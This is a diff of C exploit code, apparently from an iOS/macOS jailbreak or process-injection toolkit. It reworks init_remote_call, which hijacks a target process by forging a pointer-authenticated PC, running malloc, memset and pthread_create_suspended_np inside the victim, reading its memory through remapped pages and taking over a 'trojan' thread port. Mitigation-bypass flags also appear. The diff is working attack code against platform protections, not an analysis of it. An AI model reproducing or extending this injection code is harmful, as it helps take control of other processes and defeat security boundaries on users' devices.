@@ -1759,14 +1759,8 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         return 0;
     }
 
-    uint64_t trapSP = (uint64_t)exc.threadState.__sp & 0x7fffffffffULL;
-    uint64_t trojanMemTemp = trapSP - 0x100ULL;
     g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
     g_RC_success = true;
-    RC_DIAG("trojanMemTemp=0x%llx trapSP=0x%llx vmMap=0x%llx",
-            (unsigned long long)trojanMemTemp,
-            (unsigned long long)trapSP,
-            (unsigned long long)g_RC_vmMap);
 
     uint64_t remoteCrashSigned = remote_pac(g_RC_trojanThreadAddr, FAKE_PC_TROJAN, 0);
     RC_DIAG("bootstrap getpid begin (must catch 0x101; miss → SIGBUS 0x201)");
@@ -1779,42 +1773,49 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         return -1;
     }
 
-    // Probe whether stack page is remappable BEFORE pthread_create writes.
-    {
-        uint64_t probe = 0;
-        bool probeOk = remote_read(trojanMemTemp, &probe, sizeof(probe));
-        RC_DIAG("pre-pthread remote_read(trojanMemTemp) ok=%d val=0x%llx",
-                (int)probeOk, (unsigned long long)probe);
+    // DIAG proved SP-0x100 remaps OK but stays 0 after pthread_create ret=0
+    // (stale shmem and/or SB stack slot). Use a fresh malloc'd out-pointer instead.
+    uint64_t trojanMemTemp = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
+    if (!g_RC_success || !trojanMemTemp) {
+        RC_DIAG("malloc(16) for pthread_t out-ptr failed success=%d ptr=0x%llx",
+                (int)g_RC_success, (unsigned long long)trojanMemTemp);
+        fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
+        return -1;
     }
+    do_remote_call_temp(100, "memset", trojanMemTemp, 0, 16, 0, 0, 0, 0, 0);
+    if (!g_RC_success) {
+        RC_DIAG("memset pthread out-ptr failed");
+        do_remote_call_temp(100, "free", trojanMemTemp, 0, 0, 0, 0, 0, 0, 0);
+        fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
+        return -1;
+    }
+    RC_DIAG("pthread out-ptr malloc=0x%llx (was SP-0x100)",
+            (unsigned long long)trojanMemTemp);
 
     uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np", trojanMemTemp, 0, remoteCrashSigned, 0, 0, 0, 0, 0);
     if (!g_RC_success || createResult != 0) {
         RC_DIAG("pthread_create_suspended_np failed result=%llu success=%d",
                 (unsigned long long)createResult, (int)g_RC_success);
+        do_remote_call_temp(100, "free", trojanMemTemp, 0, 0, 0, 0, 0, 0, 0);
         fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
         return -1;
     }
-    RC_DIAG("pthread_create returned 0 — reading *trojanMemTemp via remap");
 
+    // Drop any cached remap of that page so we see the store pthread just did.
+    clear_remote_shmem_cache();
     uint64_t pthreadAddr = 0;
     bool readOk = remote_read(trojanMemTemp, &pthreadAddr, sizeof(pthreadAddr));
-    uint64_t nearLo = 0, nearHi = 0;
-    bool loOk = remote_read(trojanMemTemp - 8, &nearLo, sizeof(nearLo));
-    bool hiOk = remote_read(trojanMemTemp + 8, &nearHi, sizeof(nearHi));
-    RC_DIAG("post-pthread readOk=%d pthreadAddr=0x%llx near[-8]=0x%llx(ok=%d) near[+8]=0x%llx(ok=%d)",
+    RC_DIAG("post-pthread readOk=%d pthreadAddr=0x%llx out=0x%llx",
             (int)readOk, (unsigned long long)pthreadAddr,
-            (unsigned long long)nearLo, (int)loOk,
-            (unsigned long long)nearHi, (int)hiOk);
-    if (!readOk) {
-        RC_DIAG("remote_read(trojanMemTemp) FAILED — stack page remap/vm_get_object broken");
+            (unsigned long long)trojanMemTemp);
+    if (!readOk || !pthreadAddr) {
+        RC_DIAG("pthread out-ptr read failed/null readOk=%d addr=0x%llx",
+                (int)readOk, (unsigned long long)pthreadAddr);
+        do_remote_call_temp(100, "free", trojanMemTemp, 0, 0, 0, 0, 0, 0, 0);
         fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
         return -1;
     }
-    if (!pthreadAddr) {
-        RC_DIAG("remote_read OK but pthread pointer is NULL — create wrote 0 or wrong slot");
-        fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
-        return -1;
-    }
+    // Keep trojanMemTemp allocated for the rest of bootstrap; session mmap replaces it later.
     uint64_t callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np", pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
     RC_DEBUG("[%s:%d] callThreadPort: 0x%llx\n", __FUNCTION__, __LINE__, callThreadPort);
     if (!g_RC_success || !callThreadPort) {
